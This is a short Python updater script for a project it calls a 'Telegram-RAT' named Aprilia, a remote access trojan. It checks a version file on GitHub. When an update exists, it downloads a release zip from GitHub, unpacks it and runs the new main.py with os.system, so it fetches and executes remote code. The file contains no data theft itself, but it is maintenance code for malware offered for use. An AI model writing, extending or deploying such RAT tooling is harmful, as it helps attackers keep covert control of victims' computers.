# Import modules

import os
import time
import shutil
import urllib.request
import pathlib



RAT_Version = urllib.request.urlopen('https://raw.githubusercontent.com/BBgamesTV/Aprilia/main/Version/Version.txt').read().decode('utf8').splitlines()[0]
RAT_Changelogs = urllib.request.urlopen('https://raw.githubusercontent.com/BBgamesTV/Aprilia/main/Version/Changelogs.txt').read().decode('utf8')
RAT_Link = 'https://github.com/BBgamesTV/Aprilia/releases/download/latest/Aprilia.zip'
RAT_Path = 'Aprilia.zip'


# Checking version Telegram-RAT

if RAT_Version == '1.2':
	print('No available updates.')
	os.system('python '+'./main.py')
else:
	if os.path.exists('Updated Version ' + RAT_Version):
		print('Update is already installed.')
		input()
	else:
		print('Update available. Update now? y/n')
		print('\nChangelogs:\n' + RAT_Changelogs + '\n')
		if input().lower() == 'y'.lower():
			print('\nDownloading update...')
			urllib.request.urlretrieve(RAT_Link, RAT_Path)
			print('Unpacking archive...')
			shutil.unpack_archive(RAT_Path, str(pathlib.Path().resolve()))
			os.remove(RAT_Path)
			time.sleep(3)
			print('Update installed.')
			try : os.system('python '+'./Aprilia/main.py')
			except: pass
